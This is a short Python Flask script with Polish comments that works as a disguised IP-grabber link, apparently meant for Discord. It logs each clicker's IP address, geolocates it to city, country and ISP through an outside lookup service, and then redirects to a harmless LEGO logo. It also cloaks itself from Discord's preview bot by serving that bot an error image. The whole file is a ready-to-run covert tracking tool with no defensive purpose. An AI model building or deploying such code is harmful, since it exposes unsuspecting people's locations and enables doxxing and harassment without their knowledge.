from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
# Skrócony link do błędu (bezpośredni)
ERROR_IMG = "https://tinyurl.com/discord-error-msg" 
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

@app.route('/i') # Krótka ścieżka
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Boty dostają obrazek błędu
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return redirect(ERROR_IMG)

    # Logowanie danych do konsoli Rendera
    print(f"\n--- KLIK: {ip} ---")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')} | ISP: {r.get('isp')}")
    except: pass

    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
